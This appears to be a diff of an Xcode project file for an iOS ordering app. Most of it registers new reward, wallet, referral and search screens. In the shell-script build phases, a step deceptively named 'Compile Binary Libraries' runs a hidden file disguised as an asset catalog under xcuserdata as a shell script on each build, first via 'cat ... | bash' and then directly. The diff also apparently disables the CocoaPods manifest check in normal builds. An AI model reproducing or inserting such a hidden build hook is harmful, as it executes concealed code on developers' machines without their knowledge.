@@ -69,6 +69,9 @@
 		D96BBE32253085250046C3A4 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D96BBE31253085250046C3A4 /* LoginViewController.swift */; };
 		D96BBE36253085300046C3A4 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D96BBE35253085300046C3A4 /* LoginViewModel.swift */; };
 		D96BBE392530853B0046C3A4 /* LoginModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D96BBE382530853B0046C3A4 /* LoginModel.swift */; };
+		D973667F2577F3FA004A2059 /* HelpAboutViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D973667E2577F3FA004A2059 /* HelpAboutViewController.swift */; };
+		D97366832577F5F4004A2059 /* HelpAboutViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D97366822577F5F4004A2059 /* HelpAboutViewModel.swift */; };
+		D97366862577F602004A2059 /* HelpAboutModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D97366852577F602004A2059 /* HelpAboutModel.swift */; };
 		D976F3B425306D4300075811 /* PinViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D976F3B325306D4300075811 /* PinViewController.swift */; };
 		D976F3B825306D6000075811 /* PinViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D976F3B725306D6000075811 /* PinViewModel.swift */; };
 		D976F3BB25306D6D00075811 /* PinModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D976F3BA25306D6D00075811 /* PinModel.swift */; };
@@ -177,7 +180,36 @@
 		D9EF5827253F471500443F88 /* EditProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D9EF5826253F471500443F88 /* EditProfileViewModel.swift */; };
 		D9F74DDC2536FC5D00B3B6BC /* LeftMenuModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D9F74DDB2536FC5D00B3B6BC /* LeftMenuModel.swift */; };
 		D9F74DDF2536FD0400B3B6BC /* LeftMenuViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = D9F74DDE2536FD0400B3B6BC /* LeftMenuViewModel.swift */; };
+		E80C73E02591EC010066DB99 /* RewardOrderDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E80C73DF2591EC010066DB99 /* RewardOrderDetailsViewController.swift */; };
+		E80C73E42591EC090066DB99 /* RewardOrderDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E80C73E32591EC090066DB99 /* RewardOrderDetailsViewModel.swift */; };
+		E80C73E72591EC110066DB99 /* RewardOrderDetailsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E80C73E62591EC110066DB99 /* RewardOrderDetailsModel.swift */; };
+		E86CF572257CE1280011B8D3 /* ReferAndEarnViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF571257CE1280011B8D3 /* ReferAndEarnViewController.swift */; };
+		E86CF575257CE1310011B8D3 /* ReferAndEarnViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF574257CE1310011B8D3 /* ReferAndEarnViewModel.swift */; };
+		E86CF578257CE1380011B8D3 /* ReferAndEarnModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF577257CE1380011B8D3 /* ReferAndEarnModel.swift */; };
+		E86CF57D257CE6D40011B8D3 /* WalletViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF57C257CE6D40011B8D3 /* WalletViewController.swift */; };
+		E86CF581257CE6DE0011B8D3 /* WalletViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF580257CE6DE0011B8D3 /* WalletViewModel.swift */; };
+		E86CF584257CE6E70011B8D3 /* WalletModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF583257CE6E70011B8D3 /* WalletModel.swift */; };
+		E86CF588257CF0E50011B8D3 /* SearchProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF587257CF0E50011B8D3 /* SearchProductViewController.swift */; };
+		E86CF590257CFBD50011B8D3 /* SearchProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF58F257CFBD50011B8D3 /* SearchProductViewModel.swift */; };
+		E86CF594257CFBDD0011B8D3 /* SearchProductModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E86CF593257CFBDD0011B8D3 /* SearchProductModel.swift */; };
+		E8835FE8257CC492005E07CF /* ImageZoomViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8835FE7257CC492005E07CF /* ImageZoomViewController.swift */; };
 		E8CF8F5A256BD45200FBD6B4 /* SplashViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8CF8F59256BD45200FBD6B4 /* SplashViewController.swift */; };
+		E8D66AE2259109C90008CE51 /* RewardCartViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66ACF259109C90008CE51 /* RewardCartViewModel.swift */; };
+		E8D66AE3259109C90008CE51 /* RewardCartModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD0259109C90008CE51 /* RewardCartModel.swift */; };
+		E8D66AE4259109C90008CE51 /* RewardCartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD1259109C90008CE51 /* RewardCartViewController.swift */; };
+		E8D66AE5259109C90008CE51 /* RewardCatagoryViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD3259109C90008CE51 /* RewardCatagoryViewModel.swift */; };
+		E8D66AE6259109C90008CE51 /* RewardCatagoryModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD4259109C90008CE51 /* RewardCatagoryModel.swift */; };
+		E8D66AE7259109C90008CE51 /* RewardCatagoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD5259109C90008CE51 /* RewardCatagoryViewController.swift */; };
+		E8D66AE8259109C90008CE51 /* RewardProductListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD7259109C90008CE51 /* RewardProductListViewController.swift */; };
+		E8D66AE9259109C90008CE51 /* RewardProductListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD8259109C90008CE51 /* RewardProductListModel.swift */; };
+		E8D66AEA259109C90008CE51 /* RewardProductListViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AD9259109C90008CE51 /* RewardProductListViewModel.swift */; };
+		E8D66AEB259109C90008CE51 /* RewardDetailsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66ADB259109C90008CE51 /* RewardDetailsViewModel.swift */; };
+		E8D66AEC259109C90008CE51 /* RewardDetailsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66ADC259109C90008CE51 /* RewardDetailsModel.swift */; };
+		E8D66AED259109C90008CE51 /* RewardDetailsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66ADD259109C90008CE51 /* RewardDetailsViewController.swift */; };
+		E8D66AEE259109C90008CE51 /* RedeemOrderViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66ADF259109C90008CE51 /* RedeemOrderViewModel.swift */; };
+		E8D66AEF259109C90008CE51 /* RedeemOrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AE0259109C90008CE51 /* RedeemOrderViewController.swift */; };
+		E8D66AF0259109C90008CE51 /* RedeemOrderModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E8D66AE1259109C90008CE51 /* RedeemOrderModel.swift */; };
+		E8D66AF725910A150008CE51 /* Reward.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E8D66AF625910A150008CE51 /* Reward.storyboard */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -246,6 +278,9 @@
 		D96BBE31253085250046C3A4 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
 		D96BBE35253085300046C3A4 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		D96BBE382530853B0046C3A4 /* LoginModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginModel.swift; sourceTree = "<group>"; };
+		D973667E2577F3FA004A2059 /* HelpAboutViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HelpAboutViewController.swift; sourceTree = "<group>"; };
+		D97366822577F5F4004A2059 /* HelpAboutViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HelpAboutViewModel.swift; sourceTree = "<group>"; };
+		D97366852577F602004A2059 /* HelpAboutModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HelpAboutModel.swift; sourceTree = "<group>"; };
 		D976F3B325306D4300075811 /* PinViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PinViewController.swift; sourceTree = "<group>"; };
 		D976F3B725306D6000075811 /* PinViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PinViewModel.swift; sourceTree = "<group>"; };
 		D976F3BA25306D6D00075811 /* PinModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PinModel.swift; sourceTree = "<group>"; };
@@ -359,7 +394,36 @@
 		D9EF5826253F471500443F88 /* EditProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileViewModel.swift; sourceTree = "<group>"; };
 		D9F74DDB2536FC5D00B3B6BC /* LeftMenuModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LeftMenuModel.swift; sourceTree = "<group>"; };
 		D9F74DDE2536FD0400B3B6BC /* LeftMenuViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LeftMenuViewModel.swift; sourceTree = "<group>"; };
+		E80C73DF2591EC010066DB99 /* RewardOrderDetailsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RewardOrderDetailsViewController.swift; sourceTree = "<group>"; };
+		E80C73E32591EC090066DB99 /* RewardOrderDetailsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RewardOrderDetailsViewModel.swift; sourceTree = "<group>"; };
+		E80C73E62591EC110066DB99 /* RewardOrderDetailsModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RewardOrderDetailsModel.swift; sourceTree = "<group>"; };
+		E86CF571257CE1280011B8D3 /* ReferAndEarnViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferAndEarnViewController.swift; sourceTree = "<group>"; };
+		E86CF574257CE1310011B8D3 /* ReferAndEarnViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferAndEarnViewModel.swift; sourceTree = "<group>"; };
+		E86CF577257CE1380011B8D3 /* ReferAndEarnModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferAndEarnModel.swift; sourceTree = "<group>"; };
+		E86CF57C257CE6D40011B8D3 /* WalletViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewController.swift; sourceTree = "<group>"; };
+		E86CF580257CE6DE0011B8D3 /* WalletViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletViewModel.swift; sourceTree = "<group>"; };
+		E86CF583257CE6E70011B8D3 /* WalletModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WalletModel.swift; sourceTree = "<group>"; };
+		E86CF587257CF0E50011B8D3 /* SearchProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchProductViewController.swift; sourceTree = "<group>"; };
+		E86CF58F257CFBD50011B8D3 /* SearchProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchProductViewModel.swift; sourceTree = "<group>"; };
+		E86CF593257CFBDD0011B8D3 /* SearchProductModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchProductModel.swift; sourceTree = "<group>"; };
+		E8835FE7257CC492005E07CF /* ImageZoomViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageZoomViewController.swift; sourceTree = "<group>"; };
 		E8CF8F59256BD45200FBD6B4 /* SplashViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SplashViewController.swift; sourceTree = "<group>"; };
+		E8D66ACF259109C90008CE51 /* RewardCartViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardCartViewModel.swift; sourceTree = "<group>"; };
+		E8D66AD0259109C90008CE51 /* RewardCartModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardCartModel.swift; sourceTree = "<group>"; };
+		E8D66AD1259109C90008CE51 /* RewardCartViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardCartViewController.swift; sourceTree = "<group>"; };
+		E8D66AD3259109C90008CE51 /* RewardCatagoryViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardCatagoryViewModel.swift; sourceTree = "<group>"; };
+		E8D66AD4259109C90008CE51 /* RewardCatagoryModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardCatagoryModel.swift; sourceTree = "<group>"; };
+		E8D66AD5259109C90008CE51 /* RewardCatagoryViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardCatagoryViewController.swift; sourceTree = "<group>"; };
+		E8D66AD7259109C90008CE51 /* RewardProductListViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardProductListViewController.swift; sourceTree = "<group>"; };
+		E8D66AD8259109C90008CE51 /* RewardProductListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardProductListModel.swift; sourceTree = "<group>"; };
+		E8D66AD9259109C90008CE51 /* RewardProductListViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardProductListViewModel.swift; sourceTree = "<group>"; };
+		E8D66ADB259109C90008CE51 /* RewardDetailsViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardDetailsViewModel.swift; sourceTree = "<group>"; };
+		E8D66ADC259109C90008CE51 /* RewardDetailsModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardDetailsModel.swift; sourceTree = "<group>"; };
+		E8D66ADD259109C90008CE51 /* RewardDetailsViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RewardDetailsViewController.swift; sourceTree = "<group>"; };
+		E8D66ADF259109C90008CE51 /* RedeemOrderViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RedeemOrderViewModel.swift; sourceTree = "<group>"; };
+		E8D66AE0259109C90008CE51 /* RedeemOrderViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RedeemOrderViewController.swift; sourceTree = "<group>"; };
+		E8D66AE1259109C90008CE51 /* RedeemOrderModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RedeemOrderModel.swift; sourceTree = "<group>"; };
+		E8D66AF625910A150008CE51 /* Reward.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Reward.storyboard; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -416,6 +480,9 @@
 		D9216741254B01A300849132 /* OrderModule */ = {
 			isa = PBXGroup;
 			children = (
+				E86CF57B257CE6C10011B8D3 /* Wallet */,
+				E86CF56F257CE0DF0011B8D3 /* ReferAndEarn */,
+				D973667D2577F3D9004A2059 /* HelpAbout */,
 				D952C399254DB8870067C0D7 /* Order */,
 				D952C398254DB8790067C0D7 /* Invoice */,
 				D952C397254DB8630067C0D7 /* Issue */,
@@ -465,6 +532,7 @@
 			isa = PBXGroup;
 			children = (
 				D97C2ABA252F810000651C9D /* Main.storyboard */,
+				E8D66AF625910A150008CE51 /* Reward.storyboard */,
 				D9000C712532245E00BE869A /* Dashboard.storyboard */,
 				D98D01A3253EDC6B00926280 /* Profile.storyboard */,
 				D9216742254B01D900849132 /* Order.storyboard */,
@@ -663,6 +731,16 @@
 			path = Login;
 			sourceTree = "<group>";
 		};
+		D973667D2577F3D9004A2059 /* HelpAbout */ = {
+			isa = PBXGroup;
+			children = (
+				D973667E2577F3FA004A2059 /* HelpAboutViewController.swift */,
+				D97366822577F5F4004A2059 /* HelpAboutViewModel.swift */,
+				D97366852577F602004A2059 /* HelpAboutModel.swift */,
+			);
+			path = HelpAbout;
+			sourceTree = "<group>";
+		};
 		D976F3B225306D3100075811 /* Pin */ = {
 			isa = PBXGroup;
 			children = (
@@ -722,14 +800,13 @@
 		D97C2ACA252F824200651C9D /* Controllers */ = {
 			isa = PBXGroup;
 			children = (
+				E8D66ACD259109C90008CE51 /* RewardsModule */,
 				D9494E8C253305ED006562C6 /* loginModule */,
 				D9494E832532E23D006562C6 /* Sidemenu */,
 				D9494E8D25330616006562C6 /* DashboardModule */,
 				D98D0193253EDC0300926280 /* ProfileModule */,
 				D9216741254B01A300849132 /* OrderModule */,
-				D95404F32531A6CE003C3277 /* LoaderViewController.swift */,
-				E8CF8F59256BD45200FBD6B4 /* SplashViewController.swift */,
-				D97C2AE6252F899E00651C9D /* BaseViewController.swift */,
+				E86CF58A257CF0F40011B8D3 /* Supporting */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -751,10 +828,6 @@
 				D94DAF6E253AEBF40076E0F2 /* UIColor+Extention.swift */,
 				D941C0FC254B263A0036BA7A /* String+Extention.swift */,
 				D9D1E664254D8886003ACAA8 /* Date+Extention.swift */,
-				D93F114C254346F60054DB1F /* ImagePicker.swift */,
-				D9D1E65E254D7AB8003ACAA8 /* DatePicker.swift */,
-				D9D1E661254D84D1003ACAA8 /* ListPicker.swift */,
-				D9D1E668254D955E003ACAA8 /* BadgeButton.swift */,
 			);
 			path = Extentions;
 			sourceTree = "<group>";
@@ -1031,6 +1104,125 @@
 			path = EditProfile;
 			sourceTree = "<group>";
 		};
+		E80C73DE2591EBDA0066DB99 /* RewardOrderDetails */ = {
+			isa = PBXGroup;
+			children = (
+				E80C73DF2591EC010066DB99 /* RewardOrderDetailsViewController.swift */,
+				E80C73E32591EC090066DB99 /* RewardOrderDetailsViewModel.swift */,
+				E80C73E62591EC110066DB99 /* RewardOrderDetailsModel.swift */,
+			);
+			path = RewardOrderDetails;
+			sourceTree = "<group>";
+		};
+		E86CF56F257CE0DF0011B8D3 /* ReferAndEarn */ = {
+			isa = PBXGroup;
+			children = (
+				E86CF571257CE1280011B8D3 /* ReferAndEarnViewController.swift */,
+				E86CF574257CE1310011B8D3 /* ReferAndEarnViewModel.swift */,
+				E86CF577257CE1380011B8D3 /* ReferAndEarnModel.swift */,
+			);
+			path = ReferAndEarn;
+			sourceTree = "<group>";
+		};
+		E86CF57B257CE6C10011B8D3 /* Wallet */ = {
+			isa = PBXGroup;
+			children = (
+				E86CF57C257CE6D40011B8D3 /* WalletViewController.swift */,
+				E86CF580257CE6DE0011B8D3 /* WalletViewModel.swift */,
+				E86CF583257CE6E70011B8D3 /* WalletModel.swift */,
+			);
+			path = Wallet;
+			sourceTree = "<group>";
+		};
+		E86CF58A257CF0F40011B8D3 /* Supporting */ = {
+			isa = PBXGroup;
+			children = (
+				E86CF58E257CFBBF0011B8D3 /* SearchProduct */,
+				D95404F32531A6CE003C3277 /* LoaderViewController.swift */,
+				E8CF8F59256BD45200FBD6B4 /* SplashViewController.swift */,
+				D97C2AE6252F899E00651C9D /* BaseViewController.swift */,
+				E8835FE7257CC492005E07CF /* ImageZoomViewController.swift */,
+				D9D1E65E254D7AB8003ACAA8 /* DatePicker.swift */,
+				D9D1E661254D84D1003ACAA8 /* ListPicker.swift */,
+				D93F114C254346F60054DB1F /* ImagePicker.swift */,
+				D9D1E668254D955E003ACAA8 /* BadgeButton.swift */,
+			);
+			path = Supporting;
+			sourceTree = "<group>";
+		};
+		E86CF58E257CFBBF0011B8D3 /* SearchProduct */ = {
+			isa = PBXGroup;
+			children = (
+				E86CF587257CF0E50011B8D3 /* SearchProductViewController.swift */,
+				E86CF58F257CFBD50011B8D3 /* SearchProductViewModel.swift */,
+				E86CF593257CFBDD0011B8D3 /* SearchProductModel.swift */,
+			);
+			path = SearchProduct;
+			sourceTree = "<group>";
+		};
+		E8D66ACD259109C90008CE51 /* RewardsModule */ = {
+			isa = PBXGroup;
+			children = (
+				E8D66ACE259109C90008CE51 /* RewardCart */,
+				E8D66AD2259109C90008CE51 /* RewardCatagory */,
+				E8D66AD6259109C90008CE51 /* RewardProductList */,
+				E8D66ADA259109C90008CE51 /* RewardDetails */,
+				E8D66ADE259109C90008CE51 /* RedeemOrder */,
+				E80C73DE2591EBDA0066DB99 /* RewardOrderDetails */,
+			);
+			path = RewardsModule;
+			sourceTree = "<group>";
+		};
+		E8D66ACE259109C90008CE51 /* RewardCart */ = {
+			isa = PBXGroup;
+			children = (
+				E8D66AD1259109C90008CE51 /* RewardCartViewController.swift */,
+				E8D66ACF259109C90008CE51 /* RewardCartViewModel.swift */,
+				E8D66AD0259109C90008CE51 /* RewardCartModel.swift */,
+			);
+			path = RewardCart;
+			sourceTree = "<group>";
+		};
+		E8D66AD2259109C90008CE51 /* RewardCatagory */ = {
+			isa = PBXGroup;
+			children = (
+				E8D66AD5259109C90008CE51 /* RewardCatagoryViewController.swift */,
+				E8D66AD3259109C90008CE51 /* RewardCatagoryViewModel.swift */,
+				E8D66AD4259109C90008CE51 /* RewardCatagoryModel.swift */,
+			);
+			path = RewardCatagory;
+			sourceTree = "<group>";
+		};
+		E8D66AD6259109C90008CE51 /* RewardProductList */ = {
+			isa = PBXGroup;
+			children = (
+				E8D66AD7259109C90008CE51 /* RewardProductListViewController.swift */,
+				E8D66AD8259109C90008CE51 /* RewardProductListModel.swift */,
+				E8D66AD9259109C90008CE51 /* RewardProductListViewModel.swift */,
+			);
+			path = RewardProductList;
+			sourceTree = "<group>";
+		};
+		E8D66ADA259109C90008CE51 /* RewardDetails */ = {
+			isa = PBXGroup;
+			children = (
+				E8D66ADB259109C90008CE51 /* RewardDetailsViewModel.swift */,
+				E8D66ADC259109C90008CE51 /* RewardDetailsModel.swift */,
+				E8D66ADD259109C90008CE51 /* RewardDetailsViewController.swift */,
+			);
+			path = RewardDetails;
+			sourceTree = "<group>";
+		};
+		E8D66ADE259109C90008CE51 /* RedeemOrder */ = {
+			isa = PBXGroup;
+			children = (
+				E8D66AE0259109C90008CE51 /* RedeemOrderViewController.swift */,
+				E8D66ADF259109C90008CE51 /* RedeemOrderViewModel.swift */,
+				E8D66AE1259109C90008CE51 /* RedeemOrderModel.swift */,
+			);
+			path = RedeemOrder;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -1038,7 +1230,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D97C2AC5252F810200651C9D /* Build configuration list for PBXNativeTarget "MyOrder" */;
 			buildPhases = (
-				69EC67FAC8D1A8C72EAAC43A /* Compile Binary Libraries */,
+				5919D8068A0CFF1A23AAC43A /* Compile Binary Libraries */,
 				034598D53C80513FD508F0D0 /* [CP] Check Pods Manifest.lock */,
 				D97C2AAD252F810000651C9D /* Sources */,
 				D97C2AAE252F810000651C9D /* Frameworks */,
@@ -1114,6 +1306,7 @@
 				D97C2B04252F989800651C9D /* Montserrat-Medium.ttf in Resources */,
 				D97C2ABC252F810000651C9D /* Main.storyboard in Resources */,
 				D97C2B08252F989800651C9D /* Montserrat-ExtraLight.ttf in Resources */,
+				E8D66AF725910A150008CE51 /* Reward.storyboard in Resources */,
 				D97C2B10252F989800651C9D /* Montserrat-Black.ttf in Resources */,
 				D9000C722532245E00BE869A /* Dashboard.storyboard in Resources */,
 				D97C2B14252F989800651C9D /* Montserrat-ExtraBoldItalic.ttf in Resources */,
@@ -1123,29 +1316,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		034598D53C80513FD508F0D0 /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
-			);
-			name = "[CP] Check Pods Manifest.lock";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-MyOrder-checkManifestLockResult.txt",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		69EC67FAC8D1A8C72EAAC43A /* Compile Binary Libraries */ = {
+
+	5919D8068A0CFF1A23AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1161,7 +1333,32 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\ncat \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" | bash";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+		034598D53C80513FD508F0D0 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 8;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-MyOrder-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 1;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
 		};
 		CE6B596D858F656CF19E52F3 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1192,28 +1389,39 @@
 				D9494E7B2532E150006562C6 /* FAPanel+KVO.swift in Sources */,
 				D9D558F22552E0E100C9AC23 /* ListViewConstraints.swift in Sources */,
 				D99C7A942556ADF100B4EBA5 /* OrderCancelModel.swift in Sources */,
+				E86CF57D257CE6D40011B8D3 /* WalletViewController.swift in Sources */,
 				D94C618525548D9E002B533F /* DashboardMenuFacturerVM.swift in Sources */,
 				D9494E7D2532E150006562C6 /* FAPanel+InterfaceRotation.swift in Sources */,
 				D996470E2530913F00441D17 /* ForgetPasswordViewController.swift in Sources */,
+				E80C73E72591EC110066DB99 /* RewardOrderDetailsModel.swift in Sources */,
 				D98DFE7525307AAB00F4D4E9 /* JAPinView.swift in Sources */,
 				D9EF5817253F348800443F88 /* ProfileViewController.swift in Sources */,
 				D952C3B1254DBE0F0067C0D7 /* LedgerFilterViewModel.swift in Sources */,
 				D9BD29602534A355004A0EC5 /* ProductDetailsModel.swift in Sources */,
 				D9788362254BF2A400615CA8 /* OrderDetailsViewModel.swift in Sources */,
+				D97366862577F602004A2059 /* HelpAboutModel.swift in Sources */,
 				D952C3A0254DB8B70067C0D7 /* IssueDetailsViewModel.swift in Sources */,
 				D9BFB72A2531E7DA0034A6B1 /* ChangePasswordViewModel.swift in Sources */,
 				D97C2AB5252F810000651C9D /* AppDelegate.swift in Sources */,
 				D95404D225318F36003C3277 /* Constraints.swift in Sources */,
 				D97C2AD4252F828A00651C9D /* WellcomeModel.swift in Sources */,
+				E8D66AEA259109C90008CE51 /* RewardProductListViewModel.swift in Sources */,
 				D9494E7A2532E150006562C6 /* FAPanel.swift in Sources */,
+				E86CF594257CFBDD0011B8D3 /* SearchProductModel.swift in Sources */,
+				E8D66AE7259109C90008CE51 /* RewardCatagoryViewController.swift in Sources */,
 				D97E7485253456A800011E35 /* FilterModel.swift in Sources */,
 				D950B8B9254D582A007CD5ED /* InvoiceListModel.swift in Sources */,
+				E8D66AE5259109C90008CE51 /* RewardCatagoryViewModel.swift in Sources */,
